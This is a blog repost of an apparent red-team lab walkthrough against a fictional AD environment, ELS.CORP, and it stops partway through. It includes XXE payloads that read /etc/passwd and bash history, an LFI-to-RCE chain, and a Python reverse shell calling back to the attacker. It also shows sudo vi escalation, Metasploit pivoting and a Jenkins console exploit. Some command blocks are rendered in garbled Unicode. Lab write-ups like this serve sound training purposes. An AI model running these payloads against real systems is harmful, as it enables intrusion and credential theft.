

  <!DOCTYPE html>
  <html lang="en" data-default-color-scheme=&#34;dark&#34; >
  <style>
    .text1
    {
    text-shadow: 0px 0px 2px #f2f3f2;
    }
    </style>

  

<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/null">
  <link rel="icon" type="image/png" href="/null">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <title>æ”»å‡»é“¾ä¸ƒï¼šåŸŸæ¸—é€æ¡ˆä¾‹å›› - whale3070&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


    <body>
      <header style="height: 70vh;">
        <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>InfoSec learning</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          
        
      </ul>
    </div>
  </div>
</nav>

          <div class="banner" id="banner" false
            style="background: url('/img/default.png') no-repeat center center;
              background-size: cover;">
              <div class="full-bg-img">
                <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
                  <div class="page-header text-center fade-in-up">
                    <span class="h2 text1" id="subtitle" title="æ”»å‡»é“¾ä¸ƒï¼šåŸŸæ¸—é€æ¡ˆä¾‹å››">
                      
                        æ”»å‡»é“¾ä¸ƒï¼šåŸŸæ¸—é€æ¡ˆä¾‹å››
                      
                    </span>
        
                    
                      <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-06-22 14:16" pubdate>
        June 22, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3.2k å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      64
       åˆ†é’Ÿ
    </span>
  

  
  
</div>

                    
                  </div>
                    
                  </div>
                  
                </div>
              </div>
          </div>
      </header>

      <main>
        
          

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">æ”»å‡»é“¾ä¸ƒï¼šåŸŸæ¸—é€æ¡ˆä¾‹å››</h1>
            
            <div class="markdown-body">
              <h1 id="Red-teaming-Active-Directory-Lab-3-ELS-CORP-Attack-Path-2"><a href="#Red-teaming-Active-Directory-Lab-3-ELS-CORP-Attack-Path-2" class="headerlink" title="Red-teaming Active Directory Lab #3 (ELS.CORP) (Attack Path 2)"></a>Red-teaming Active Directory Lab #3 (ELS.CORP) (Attack Path 2)</h1><p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image2.png" srcset="/img/loading.gif"></p>
<h2 id="Contents"><a href="#Contents" class="headerlink" title="Contents"></a>Contents</h2><p><strong>Web Server Attack Path (Path 2)</strong></p>
<ol>
<li><p> Prod-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
<li><p> OPS-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
<li><p> ELS-CHILDDC . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
<li><p> ELS-DC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
<li><p> MGMT-DC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
<li><p> JUMP-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
<li><p> Admin-SYS . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
</ol>
<h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><p>You have been asked to execute a (black-box) red teaming exercise against eLS Corp (including any related/trusted forest). The letter of engagement has specified:</p>
<ol>
<li><p> The ADMIN-SYS system as the crown jewel. This means that the ultimate goal of this red teaming exercise is to obtain access to the ADMIN-SYS system.</p>
</li>
<li><p> That during this exercise, the web application hosted on 172.16.250.2 is included in the scope and you can exploit it to gain initial foothold</p>
</li>
<li><p> The mail server hosted on 172.16.250.2 is out of scope and should not be touched</p>
</li>
<li><p> That the pentestersâ€™ network range is 172.16.25.0/24 and a static route has been configured so that pentesters can access the 172.16.250.0/24 network range, where eLS Corp assets exist</p>
</li>
<li><p> For any cracking activities use theÂ <em>/usr/share/wordlists/rockyou.txt</em>Â wordlist, included in latest Kaliâ€™s</p>
</li>
</ol>
<h2 id="Hints"><a href="#Hints" class="headerlink" title="Hints"></a>Hints</h2><p>Refer to the attack path diagram of page 1 only when you are out of options.</p>
<ol>
<li> <strong>Prod-SRV Server</strong></li>
</ol>
<p>Scanning the accessible IP range from the scope of engagement provides us with two possible entry points both residing on the â€œ<strong>172.16.250.2</strong>â€œ IP. Specifically, scanning the TCP ports ofÂ <strong>172.16.250.2</strong>Â tells us that an SMTP server and a web application are running on TCP ports 25 and 80.Â According to the letter of engagement, the SMTP server is out of scope.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image3.jpeg" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image4.png" srcset="/img/loading.gif"></p>
<p>Accessing port 80 through a web browser reveals that a web service is running with a login/registration</p>
<p>functionality.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image5.jpeg" srcset="/img/loading.gif"></p>
<p>Registering and checking the request and response from the portal suggests that XML technology is used to transfer information from the client to the server. Letâ€™s check if the portal is vulnerable to XML External Entity (XXE) attacks.</p>
<p>Using the following XXE payload after capturing the request in the web portal leads to internal file disclosure.</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTFâˆ’8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">abc</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">ab</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;ab;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">tel</span>&gt;</span>11111111<span class="hljs-tag">&lt;/<span class="hljs-name">tel</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>yb@sq.co<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>12345<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>Through internal file disclosing, sensitive information can easily be obtained (through the XXE vulnerability). For now, we will look for the â€œ<strong>/etc/passwd</strong>â€œ file.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image6.jpeg" srcset="/img/loading.gif"></p>
<p>A local user named â€œ<strong>prod-admin</strong>â€œ is clearly visible in the â€œ<strong>/etc/passwd</strong>â€œ file, letâ€™s enumerate more to see if we can gain some more information about the discovered user.</p>
<p>Looking at the â€œ.<strong>bash_history</strong>â€œ file of the â€œ<strong>prod-admin</strong>â€œ user, another internal file is disclosed which cannot be obtained via directory brute-forcing.</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTFâˆ’8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">abc</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">ab</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///home/prod-admin/.bash_history&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;ab;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">tel</span>&gt;</span>11111111<span class="hljs-tag">&lt;/<span class="hljs-name">tel</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>yb@sq.co<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>12345<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>The interesting internal files disclosed are located atÂ <strong>â€˜/var/www/html/Lab-User.php</strong>â€˜ andÂ <strong>â€˜/var/www/Lab-Admin.php</strong>â€˜.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image7.jpeg" srcset="/img/loading.gif"></p>
<p>However, we cannot read the files directly, we will use php filter as our workaround to disclose file contents in base64 format and then convert it to a readable format.</p>
<p>The content of theÂ <strong>â€œ/var/www/html/Lab-User.php</strong>â€œ file can be viewed, as follows:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image8.jpeg" srcset="/img/loading.gif"></p>
<p>Copy the Base64 string from the response body of Burp Suite and then use the following command to read the contents in a readable format.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image9.jpeg" srcset="/img/loading.gif"></p>
<p>From the fileÂ <strong>â€œ/var/www/html/Lab-User.php</strong>â€œ an input parameter â€œ<strong>page</strong>â€œ is disclosed which can be used to include files as parameters in the URL.</p>
<p>Similarly, the content of theÂ <strong>â€œ/var/www/Lab-Admin.php</strong>â€œ file can also be viewed using the PHP filter.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image10.jpeg" srcset="/img/loading.gif"></p>
<p>A URL parameter â€˜<strong>cmd</strong>â€˜ is disclosed for command execution inside â€˜<strong>Lab-Admin.php</strong>â€˜</p>
<p>This means that the file â€œ<strong>Lab-User.php</strong>â€œ can be used to include another file and the â€œ<strong>Lab-Admin.php</strong>â€œ file can be used to execute commands.</p>
<p>Command execution can be achieved, as follows.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image11.png" srcset="/img/loading.gif"></p>
<p>We have successfully exploited the portal through the below vulnerability chain:</p>
<p>â€œ<strong>XXE â†’ LFI â†’ RCE</strong>â€œ</p>
<p>Next step would be to establish a stable reverse shell leveraging RCE for initial access. Use the following command to get a reverse shell from the â€œ<strong>Prod-SRV</strong>â€œ server.</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.16.250.2</span>/Lab-User.php?page=../Lab-Admin.php&amp;cmd=python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;172.16.25.x&quot;</span>,<span class="hljs-number">4444</span>));os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">0</span>);os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">1</span>);os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<br></code></pre></div></td></tr></table></figure>

<p>We will be using Metasploit â€œ<strong>multi/handlerâ€</strong>Â module to receive the reverse shell.</p>
<figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">cmd</span>/unix/<span class="hljs-comment">reverse_python</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST &lt;attacking_IP&gt;</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT &lt;listening_port&gt;</span><br>run <span class="hljs-comment">-j</span><br></code></pre></div></td></tr></table></figure>

<p>Reverse shell of Prod-SRV server.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image12.jpeg" srcset="/img/loading.gif"></p>
<p>Neat! We have a shell with â€˜<strong>www-dataâ€™</strong>Â privileges. Upgrade the session to stable meterpreter session.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image13.jpeg" srcset="/img/loading.gif"></p>
<p>For privilege escalation, â€œ<strong>www-data</strong>â€œ user can execute â€œ<strong>sudo</strong>â€œ with â€œ<strong>vi</strong>â€œ as prod-admin user, this can be checked &amp; abused as follows:</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">ğ‘ â„ğ‘’ğ‘™ğ‘™<br>ğ‘ğ‘¦ğ‘¡â„ğ‘œğ‘› âˆ’ğ‘ â€œğ‘–ğ‘šğ‘ğ‘œğ‘Ÿğ‘¡ ğ‘ğ‘¡ğ‘¦;ğ‘ğ‘¡ğ‘¦.ğ‘ ğ‘ğ‘ğ‘¤ğ‘›(â€˜<span class="hljs-regexp">/ğ‘ğ‘–ğ‘›/</span>ğ‘ğ‘ğ‘ â„â€™);â€<br>ğ‘ ğ‘¢ğ‘‘ğ‘œ âˆ’ğ‘™<br><br>&lt;ğ‘…ğ‘’ğ‘ ğ‘¢ğ‘™ğ‘¡&gt;<br>ğ‘ˆğ‘ ğ‘’ğ‘Ÿ ğ‘¤ğ‘¤ğ‘¤âˆ’ğ‘‘ğ‘ğ‘¡ğ‘ ğ‘šğ‘ğ‘¦ ğ‘Ÿğ‘¢ğ‘› ğ‘¡â„ğ‘’ ğ‘“ğ‘œğ‘™ğ‘™ğ‘œğ‘¤ğ‘–ğ‘›ğ‘” ğ‘ğ‘œğ‘šğ‘šğ‘ğ‘›ğ‘‘ğ‘  ğ‘œğ‘› ğ‘ƒğ‘Ÿğ‘œğ‘‘âˆ’ğ‘†ğ‘Ÿğ‘£:<br>(ğ’‘ğ’“ğ’ğ’…âˆ’ğ’‚ğ’…ğ’ğ’Šğ’) <span class="hljs-regexp">/ğ’–ğ’”ğ’“/</span>ğ’ƒğ’Šğ’/ğ’—ğ’Š, ğ‘µğ‘¶ğ‘·ğ‘¨ğ‘ºğ‘ºğ‘¾ğ‘«:ğ‘¨ğ‘³ğ‘³<br>&lt;/ğ‘…ğ‘’ğ‘ ğ‘¢ğ‘™ğ‘¡&gt;<br><br>ğ‘ ğ‘¢ğ‘‘ğ‘œ âˆ’ğ‘¢ ğ‘ğ‘Ÿğ‘œğ‘‘âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘› ğ‘£ğ‘–<br>ğ‘ƒğ‘Ÿğ‘’ğ‘ ğ‘  â€œğ‘¬ğ‘ºğ‘ª +âˆ¶ â€<br>!<span class="hljs-regexp">/ğ‘ğ‘–ğ‘›/</span>ğ‘ â„<br>ğ‘ğ‘ğ‘ â„ âˆ’ğ‘–<br>ğ‘¤â„ğ‘œğ‘ğ‘šğ‘–<br><br>&lt;ğ‘…ğ‘’ğ‘ ğ‘¢ğ‘™ğ‘¡&gt;<br>ğ‘·ğ’“ğ’ğ’…âˆ’ğ’‚ğ’…ğ’ğ’Šğ’<br>&lt;/ğ‘…ğ‘’ğ‘ ğ‘¢ğ‘™ğ‘¡&gt;<br></code></pre></div></td></tr></table></figure>

<p>Escalated to â€œ<strong>prod-admin</strong>â€œ user.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image14.png" srcset="/img/loading.gif"></p>
<p>However, to move forward we need an internal IP address. Interestingly enough, this machine does not have another interface. If you recall, during enumeration we found that the â€œ<strong>.bash_history</strong>â€œ of the prod-admin user contains links to some log files.</p>
<p>The â€œ<strong>10.10.2.4</strong>â€œ IP address can be spotted on the â€œ<strong>/var/log/auth.log</strong>â€œ file.</p>
<p><strong>Note</strong>: if the log is filled, it is automatically shifted to â€œ/var/log/auth.log.1â€ or â€˜/var/log/auth.log.2â€™ and so on, check this too if the IP address is not found.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image15.png" srcset="/img/loading.gif"></p>
<p>With the discoveredÂ <strong>â€œ10.10.2.4â€</strong>Â IP address we will add a route to the â€œ10.10.2.0/24â€ network and start a socks server.</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">On meterpreter prompt<br><br>ğ‘Ÿğ‘œğ‘¢ğ‘¡ğ‘’ ğ‘ğ‘‘ğ‘‘ <span class="hljs-number">10.10</span>.<span class="hljs-number">2.0</span>/<span class="hljs-number">24</span> &lt;ğ‘ ğ‘’ğ‘ ğ‘ ğ‘–ğ‘œğ‘›_ğ¼ğ·&gt;<br>ğ‘Ÿğ‘œğ‘¢ğ‘¡ğ‘’<br><br>Start SOCKS server<br>ğ‘¢ğ‘ ğ‘’ ğ‘ğ‘¢ğ‘¥ğ‘–ğ‘™ğ‘–ğ‘ğ‘Ÿğ‘¦<span class="hljs-regexp">/ğ‘ ğ‘’ğ‘Ÿğ‘£ğ‘’ğ‘Ÿ/</span>ğ‘ ğ‘œğ‘ğ‘˜ğ‘ <span class="hljs-number">4</span>ğ‘<br>ğ‘ â„ğ‘œğ‘¤ ğ‘œğ‘ğ‘¡ğ‘–ğ‘œğ‘›ğ‘ <br>ğ‘ ğ‘’ğ‘¡ ğ‘†ğ‘…ğ‘‰ğ»ğ‘‚ğ‘†ğ‘‡ <span class="hljs-number">172.16</span>.<span class="hljs-number">25</span>.ğ‘¥<br>ğ‘ ğ‘’ğ‘¡ ğ‘†ğ‘…ğ‘‰ğ‘ƒğ‘‚ğ‘…ğ‘‡ &lt;ğ‘™ğ‘–ğ‘ ğ‘¡ğ‘’ğ‘›ğ‘–ğ‘›ğ‘”_ğ‘ğ‘œğ‘Ÿğ‘¡&gt;<br>ğ‘Ÿğ‘¢ğ‘› âˆ’ğ‘—<br><br>Modify <span class="hljs-regexp">/etc/</span>proxychains.conf<br>ğ‘ ğ‘œğ‘ğ‘˜ğ‘ <span class="hljs-number">4</span>ğ‘ <span class="hljs-number">172.16</span>.<span class="hljs-number">25</span>.ğ‘¥ <span class="hljs-number">1080</span><br></code></pre></div></td></tr></table></figure>

<p>Now, we will scan the TCP ports of the discovered IP address â€œ<strong>10.10.2.4</strong>â€œ.</p>
<ol>
<li> <strong>OPS-SRV Server</strong></li>
</ol>
<p>Leveraging the route to the â€œ10.10.2.0/24â€ network and scanning TCP ports using proxychains reveals that a web server is running on 8080.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image16.png" srcset="/img/loading.gif"></p>
<p>Open Firefox (or any web browser) with proxychains and point the browser to portÂ <strong>8080</strong>Â ofÂ <strong>10.10.2.4</strong></p>
<p><strong>URL: <a target="_blank" rel="noopener" href="http://10.10.2.4:8080/">http://10.10.2.4:8080</a></strong></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image17.jpeg" srcset="/img/loading.gif"></p>
<p>A Jenkins server is running with guessable credentials. Specifically,Â <strong>â€œadmin/adminâ€</strong>Â is a valid set of username/password.</p>
<p>After authentication, it is found that the â€˜<strong>adminâ€™</strong>Â user has view-only rights. Browsing straight to the credentials store, clear text credentials of â€œ<strong>Jenkins-admin</strong>â€œ can be been found.</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">Browse <span class="hljs-built_in">to</span>:<br><span class="hljs-keyword">http</span>://<span class="hljs-number">10.10</span><span class="hljs-number">.2</span><span class="hljs-number">.4</span>:<span class="hljs-number">8080</span><br><br>Authenticate <span class="hljs-keyword">with</span>:<br>ğ‘ğ‘‘ğ‘šğ‘–ğ‘›/ğ‘ğ‘‘ğ‘šğ‘–ğ‘›<br><br>Head straight <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> credentials store, <span class="hljs-keyword">the</span> following credentials were found:<br>ğ‘—ğ‘’ğ‘›ğ‘˜ğ‘–ğ‘›ğ‘ âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›\ğ´ğ‘‘ğ‘š!ğ‘›@ğ½<span class="hljs-number">3</span>ğ‘›ğ‘˜!ğ‘›ğ‘ <br></code></pre></div></td></tr></table></figure>

<p>Logout and login again as â€œ<strong>jenkins-admin</strong>â€œ using the identified credentials.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image18.png" srcset="/img/loading.gif"></p>
<p>We can establish a shell with the â€œ<strong>ops-srv</strong>â€œ machine by building and executing a malicious task. In order to do so we will use Metasploitâ€™s â€œ<strong>jenkins_script_console</strong>â€œ module.</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Configure Exploit:<br>ğ‘¢ğ‘ ğ‘’ ğ‘’ğ‘¥ğ‘ğ‘™ğ‘œğ‘–ğ‘¡<span class="hljs-regexp">/ğ‘šğ‘¢ğ‘™ğ‘¡ğ‘–/</span>â„ğ‘¡ğ‘¡ğ‘/ğ‘—ğ‘’ğ‘›ğ‘˜ğ‘–ğ‘›ğ‘ _ğ‘ ğ‘ğ‘Ÿğ‘–ğ‘ğ‘¡_ğ‘ğ‘œğ‘›ğ‘ ğ‘œğ‘™ğ‘’<br>ğ‘ ğ‘’ğ‘¡ ğ‘¡ğ‘ğ‘Ÿğ‘”ğ‘’ğ‘¡ <span class="hljs-number">1</span><br>ğ‘ ğ‘’ğ‘¡ ğ‘‡ğ´ğ‘…ğºğ¸ğ‘‡ğ‘ˆğ‘…ğ¼ /<br>ğ‘ ğ‘’ğ‘¡ ğ‘…ğ‘ƒğ‘‚ğ‘…ğ‘‡ <span class="hljs-number">8080</span><br>ğ‘ ğ‘’ğ‘¡ ğ‘ˆğ‘†ğ¸ğ‘…ğ‘ğ´ğ‘€ğ¸ ğ‘—ğ‘’ğ‘›ğ‘˜ğ‘–ğ‘›ğ‘ âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›<br>ğ‘ ğ‘’ğ‘¡ ğ‘ƒğ´ğ‘†ğ‘†ğ‘Šğ‘‚ğ‘…ğ· ğ´ğ‘‘ğ‘š!ğ‘›@ğ½<span class="hljs-number">3</span>ğ‘›ğ‘˜!ğ‘›ğ‘ <br><br>Configure Payload:<br>ğ‘ ğ‘’ğ‘¡ ğ‘ğ‘ğ‘¦ğ‘™ğ‘œğ‘ğ‘‘ ğ‘™ğ‘–ğ‘›ğ‘¢ğ‘¥<span class="hljs-regexp">/ğ‘¥86/</span>ğ‘ â„ğ‘’ğ‘™ğ‘™_ğ‘ğ‘–ğ‘›ğ‘‘_ğ‘¡ğ‘ğ‘<br>ğ‘ ğ‘’ğ‘¡ ğ‘Ÿâ„ğ‘œğ‘ ğ‘¡ <span class="hljs-number">10.10</span>.<span class="hljs-number">2.4</span><br>ğ‘ ğ‘’ğ‘¡ ğ‘£ğ‘’ğ‘Ÿğ‘ğ‘œğ‘ 